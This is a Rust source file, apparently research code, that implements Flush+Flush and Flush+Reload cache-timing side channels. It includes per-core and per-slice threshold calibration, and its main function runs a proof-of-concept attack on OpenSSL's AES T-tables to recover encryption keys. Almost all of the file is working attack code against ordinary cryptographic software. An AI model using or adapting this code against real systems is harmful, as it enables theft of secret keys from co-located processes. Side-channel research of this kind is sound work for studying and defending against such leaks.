#![feature(unsafe_block_in_unsafe_fn)]
#![deny(unsafe_op_in_unsafe_fn)]
use aes_t_tables::SideChannelError::{AddressNotCalibrated, AddressNotReady};
use aes_t_tables::{
    attack_t_tables_poc, AESTTableParams, CacheStatus, ChannelFatalError,
    MultipleAddrCacheSideChannel, SideChannelError, SingleAddrCacheSideChannel,
};
use cache_utils::calibration::{
    get_cache_slicing, only_flush, CalibrateOperation2T, CalibrationOptions, HistParams, Verbosity,
    CFLUSH_BUCKET_NUMBER, CFLUSH_BUCKET_SIZE, CFLUSH_NUM_ITER,
};
use cache_utils::{find_core_per_socket, flush, maccess, noop};
use std::collections::{HashMap, HashSet};
use std::path::Path;

use aes_t_tables::naive_flush_and_reload::*;

type VPN = usize;
type Slice = u8;

use cache_utils::calibration::calibrate_fixed_freq_2_thread;
use cache_utils::complex_addressing::CacheSlicing;
use core::fmt;
use nix::sched::{sched_getaffinity, sched_setaffinity, CpuSet};
use nix::unistd::Pid;
use std::fmt::{Debug, Formatter};
use std::i8::MAX; // TODO

#[derive(Debug)]
struct Threshold {
    pub value: u64,
    pub miss_faster_than_hit: bool,
}

impl Threshold {
    pub fn is_hit(&self, time: u64) -> bool {
        self.miss_faster_than_hit && time >= self.value
            || !self.miss_faster_than_hit && time < self.value
    }
}

struct FlushAndFlush {
    thresholds: HashMap<VPN, HashMap<Slice, Threshold>>,
    addresses_ready: HashSet<*const u8>,
    slicing: CacheSlicing,
    original_affinities: CpuSet,
}

#[derive(Debug)]
struct SingleFlushAndFlush(FlushAndFlush);

impl SingleFlushAndFlush {
    pub fn new() -> Option<Self> {
        FlushAndFlush::new().map(|ff| SingleFlushAndFlush(ff))
    }
}

impl SingleAddrCacheSideChannel for SingleFlushAndFlush {
    unsafe fn test_single(&mut self, addr: *const u8) -> Result<CacheStatus, SideChannelError> {
        unsafe { self.0.test_single(addr) }
    }

    unsafe fn prepare_single(&mut self, addr: *const u8) -> Result<(), SideChannelError> {
        unsafe { self.0.prepare_single(addr) }
    }

    fn victim_single(&mut self, operation: &dyn Fn()) {
        self.0.victim_single(operation)
    }

    unsafe fn calibrate_single(
        &mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
    ) -> Result<(), ChannelFatalError> {
        unsafe { self.0.calibrate_single(addresses) }
    }
}

// Current issue : hash function trips borrow checker.
// Also need to finish implementing the calibration logic

impl FlushAndFlush {
    pub fn new() -> Option<Self> {
        if let Some(slicing) = get_cache_slicing(find_core_per_socket()) {
            if !slicing.can_hash() {
                return None;
            }

            let old = sched_getaffinity(Pid::from_raw(0)).unwrap();

            let ret = Self {
                thresholds: Default::default(),
                addresses_ready: Default::default(),
                slicing,
                original_affinities: old,
            };
            Some(ret)
        } else {
            None
        }
    }

    fn get_slice(&self, addr: *const u8) -> Slice {
        self.slicing.hash(addr as usize).unwrap()
    }
}

impl Drop for FlushAndFlush {
    fn drop(&mut self) {
        sched_setaffinity(Pid::from_raw(0), &self.original_affinities).unwrap();
    }
}

impl Debug for FlushAndFlush {
    fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
        f.debug_struct("FlushAndFlush")
            .field("thresholds", &self.thresholds)
            .field("addresses_ready", &self.addresses_ready)
            .field("slicing", &self.slicing)
            .finish()
    }
}

const PAGE_LEN: usize = 1 << 12;

fn get_vpn<T>(p: *const T) -> usize {
    (p as usize) & (!(PAGE_LEN - 1)) // FIXME
}

fn cum_sum(vector: &[u32]) -> Vec<u32> {
    let len = vector.len();
    let mut res = vec![0; len];
    res[0] = vector[0];
    for i in 1..len {
        res[i] = res[i - 1] + vector[i];
    }
    assert_eq!(len, res.len());
    assert_eq!(len, vector.len());
    res
}

impl MultipleAddrCacheSideChannel for FlushAndFlush {
    const MAX_ADDR: u32 = 3;

    unsafe fn test<'a, 'b, 'c>(
        &'a mut self,
        addresses: &'b mut (impl Iterator<Item = &'c *const u8> + Clone),
    ) -> Result<Vec<(*const u8, CacheStatus)>, SideChannelError> {
        let mut result = Vec::new();
        let mut tmp = Vec::new();
        let mut i = 0;
        for addr in addresses {
            i += 1;
            let t = unsafe { only_flush(*addr) };
            tmp.push((addr, t));
            if i == Self::MAX_ADDR {
                break;
            }
        }
        for (addr, time) in tmp {
            if !self.addresses_ready.contains(&addr) {
                return Err(AddressNotReady(*addr));
            }
            let vpn: VPN = (*addr as usize) & (!0xfff); // FIXME
            let slice = self.get_slice(*addr);
            let threshold = &self.thresholds[&vpn][&slice];
            // refactor this into a struct threshold method ?
            if threshold.is_hit(time) {
                result.push((*addr, CacheStatus::Hit))
            } else {
                result.push((*addr, CacheStatus::Miss))
            }
        }
        Ok(result)
    }

    unsafe fn prepare<'a, 'b, 'c>(
        &'a mut self,
        addresses: &'b mut (impl Iterator<Item = &'c *const u8> + Clone),
    ) -> Result<(), SideChannelError> {
        use core::arch::x86_64 as arch_x86;
        let mut i = 0;
        let addresses_cloned = addresses.clone();
        for addr in addresses_cloned {
            i += 1;
            let vpn: VPN = get_vpn(*addr);
            let slice = self.get_slice(*addr);
            if self.addresses_ready.contains(&addr) {
                continue;
            }
            if !self.thresholds.contains_key(&vpn) || !self.thresholds[&vpn].contains_key(&slice) {
                return Err(AddressNotCalibrated(*addr));
            }
            if i == Self::MAX_ADDR {
                break;
            }
        }
        i = 0;
        for addr in addresses {
            i += 1;
            unsafe { flush(*addr) };
            self.addresses_ready.insert(*addr);
            if i == Self::MAX_ADDR {
                break;
            }
        }
        unsafe { arch_x86::_mm_mfence() };
        Ok(())
    }

    fn victim(&mut self, operation: &dyn Fn()) {
        operation(); // TODO use a different helper core ?
    }

    unsafe fn calibrate(
        &mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
    ) -> Result<(), ChannelFatalError> {
        let mut pages = HashMap::<VPN, HashSet<*const u8>>::new();
        for addr in addresses {
            let page = get_vpn(addr);
            pages.entry(page).or_insert_with(HashSet::new).insert(addr);
        }

        let core_per_socket = find_core_per_socket();

        let operations = [
            CalibrateOperation2T {
                prepare: maccess::<u8>,
                op: only_flush,
                name: "clflush_remote_hit",
                display_name: "clflush remote hit",
            },
            CalibrateOperation2T {
                prepare: noop::<u8>,
                op: only_flush,
                name: "clflush_miss",
                display_name: "clflush miss",
            },
        ];
        const HIT_INDEX: usize = 0;
        const MISS_INDEX: usize = 1;

        // Generate core iterator
        let mut core_pairs: Vec<(usize, usize)> = Vec::new();

        let old = sched_getaffinity(Pid::from_raw(0)).unwrap();

        for i in 0..CpuSet::count() {
            if old.is_set(i).unwrap() {
                core_pairs.push((i, i));
            }
        }

        // Probably needs more metadata
        let mut per_core: HashMap<usize, HashMap<VPN, HashMap<Slice, (Threshold, f32)>>> =
            HashMap::new();

        let mut core_averages: HashMap<usize, (f32, u32)> = HashMap::new();

        for (page, _) in pages {
            let p = page as *const u8;
            let r = unsafe {
                calibrate_fixed_freq_2_thread(
                    p,
                    64,                // FIXME : MAGIC
                    PAGE_LEN as isize, // MAGIC
                    &mut core_pairs.clone().into_iter(),
                    &operations,
                    CalibrationOptions {
                        hist_params: HistParams {
                            bucket_number: CFLUSH_BUCKET_NUMBER,
                            bucket_size: CFLUSH_BUCKET_SIZE,
                            iterations: CFLUSH_NUM_ITER << 1,
                        },
                        verbosity: Verbosity::NoOutput,
                        optimised_addresses: true,
                    },
                    core_per_socket,
                )
            };

            /* TODO refactor a good chunk of calibration result analysis to make thresholds in a separate function
            Generating Cumulative Sums and then using that to compute error count for each possible threshold is a recurring joke.
            It might be worth in a second time to refactor this to handle more generic strategies (such as double thresholds)
            What about handling non attributes values (time values that are not attributed as hit or miss)
            */

            for result2t in r {
                if result2t.main_core != result2t.helper_core {
                    panic!("Unexpected core numbers");
                }
                let core = result2t.main_core;
                match result2t.res {
                    Err(e) => panic!("Oops: {:#?}", e),
                    Ok(results_1t) => {
                        for r1t in results_1t {
                            let offset = r1t.offset;
                            let addr = unsafe { p.offset(offset) };
                            let slice = self.get_slice(addr);
                            let miss_hist = &r1t.histogram[MISS_INDEX];
                            let hit_hist = &r1t.histogram[HIT_INDEX];
                            if miss_hist.len() != hit_hist.len() {
                                panic!("Maformed results");
                            }
                            let len = miss_hist.len();
                            let miss_cum_sum = cum_sum(miss_hist);
                            let hit_cum_sum = cum_sum(hit_hist);
                            let miss_total = miss_cum_sum[len - 1];
                            let hit_total = hit_cum_sum[len - 1];

                            // Threshold is less than equal => miss, strictly greater than => hit
                            let mut error_miss_less_than_hit = vec![0; len - 1];
                            // Threshold is less than equal => hit, strictly greater than => miss
                            let mut error_hit_less_than_miss = vec![0; len - 1];

                            let mut min_error_hlm = u32::max_value();
                            let mut min_error_mlh = u32::max_value();

                            for i in 0..(len - 1) {
                                error_hit_less_than_miss[i] =
                                    miss_cum_sum[i] + (hit_total - hit_cum_sum[i]);
                                error_miss_less_than_hit[i] =
                                    hit_cum_sum[i] + (miss_total - miss_cum_sum[i]);

                                if error_hit_less_than_miss[i] < min_error_hlm {
                                    min_error_hlm = error_hit_less_than_miss[i];
                                }
                                if error_miss_less_than_hit[i] < min_error_mlh {
                                    min_error_mlh = error_miss_less_than_hit[i];
                                }
                            }

                            let hlm = min_error_hlm < min_error_mlh;

                            let (errors, min_error) = if hlm {
                                (&error_hit_less_than_miss, min_error_hlm)
                            } else {
                                (&error_miss_less_than_hit, min_error_mlh)
                            };

                            let mut potential_thresholds = Vec::new();

                            for i in 0..errors.len() {
                                if errors[i] == min_error {
                                    let num_true_hit;
                                    let num_false_hit;
                                    let num_true_miss;
                                    let num_false_miss;
                                    if hlm {
                                        num_true_hit = hit_cum_sum[i];
                                        num_false_hit = miss_cum_sum[i];
                                        num_true_miss = miss_total - num_false_hit;
                                        num_false_miss = hit_total - num_true_hit;
                                    } else {
                                        num_true_miss = miss_cum_sum[i];
                                        num_false_miss = hit_cum_sum[i];
                                        num_true_hit = hit_total - num_false_miss;
                                        num_false_hit = miss_total - num_true_miss;
                                    }
                                    potential_thresholds.push((
                                        i,
                                        num_true_hit,
                                        num_false_hit,
                                        num_true_miss,
                                        num_false_miss,
                                        min_error as f32 / (hit_total + miss_total) as f32,
                                    ));
                                }
                            }

                            let index = (potential_thresholds.len() - 1) / 2;
                            let (threshold, _, _, _, _, error_rate) = potential_thresholds[index];
                            // insert in per_core
                            if per_core
                                .entry(core)
                                .or_insert_with(HashMap::new)
                                .entry(page)
                                .or_insert_with(HashMap::new)
                                .insert(
                                    slice,
                                    (
                                        Threshold {
                                            value: threshold as u64, // FIXME the bucket to time conversion
                                            miss_faster_than_hit: !hlm,
                                        },
                                        error_rate,
                                    ),
                                )
                                .is_some()
                            {
                                panic!("Duplicate slice result");
                            }
                            let core_average = core_averages.get(&core).unwrap_or(&(0.0, 0));
                            let new_core_average =
                                (core_average.0 + error_rate, core_average.1 + 1);
                            core_averages.insert(core, new_core_average);
                        }
                    }
                }
            }
        }

        // We now have a HashMap associating stuffs to cores, iterate on it and select the best.
        let mut best_core = 0;

        let mut best_error_rate = {
            let ca = core_averages[&0];
            ca.0 / ca.1 as f32
        };
        for (core, average) in core_averages {
            let error_rate = average.0 / average.1 as f32;
            if error_rate < best_error_rate {
                best_core = core;
                best_error_rate = error_rate;
            }
        }
        let mut thresholds = HashMap::new();
        println!("Best core: {}, rate: {}", best_core, best_error_rate);
        let tmp = per_core.remove(&best_core).unwrap();
        for (page, per_page) in tmp {
            let page_entry = thresholds.entry(page).or_insert_with(HashMap::new);
            for (slice, per_slice) in per_page {
                println!(
                    "page: {:x}, slice: {}, threshold: {:?}, error_rate: {}",
                    page, slice, per_slice.0, per_slice.1
                );
                page_entry.insert(slice, per_slice.0);
            }
        }
        self.thresholds = thresholds;
        println!("{:#?}", self.thresholds);

        // TODO handle error better for affinity setting and other issues.

        self.addresses_ready.clear();

        let mut cpuset = CpuSet::new();
        cpuset.set(best_core).unwrap();
        sched_setaffinity(Pid::from_raw(0), &cpuset).unwrap();
        Ok(())
    }
}

const KEY2: [u8; 32] = [
    0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc,
    0x4f, 0x6e, 0x9c, 0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80,
];

fn main() {
    let open_sslpath = Path::new(env!("OPENSSL_DIR")).join("lib/libcrypto.so");
    let mut side_channel = NaiveFlushAndReload::from_threshold(220);
    unsafe {
        attack_t_tables_poc(
            &mut side_channel,
            AESTTableParams {
                num_encryptions: 1 << 12,
                key: [0; 32],
                te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
                openssl_path: &open_sslpath,
            },
        )
    }; /**/
    unsafe {
        attack_t_tables_poc(
            &mut side_channel,
            AESTTableParams {
                num_encryptions: 1 << 12,
                key: KEY2,
                te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
                openssl_path: &open_sslpath,
            },
        )
    };
    {
        let mut side_channel_ff = FlushAndFlush::new().unwrap();
        unsafe {
            attack_t_tables_poc(
                &mut side_channel_ff,
                AESTTableParams {
                    num_encryptions: 1 << 12,
                    key: [0; 32],
                    te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
                    openssl_path: &open_sslpath,
                },
            )
        };
    }
    {
        let mut side_channel_ff = SingleFlushAndFlush::new().unwrap();
        unsafe {
            attack_t_tables_poc(
                &mut side_channel_ff,
                AESTTableParams {
                    num_encryptions: 1 << 12,
                    key: KEY2,
                    te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
                    openssl_path: &open_sslpath,
                },
            )
        };
    }
}
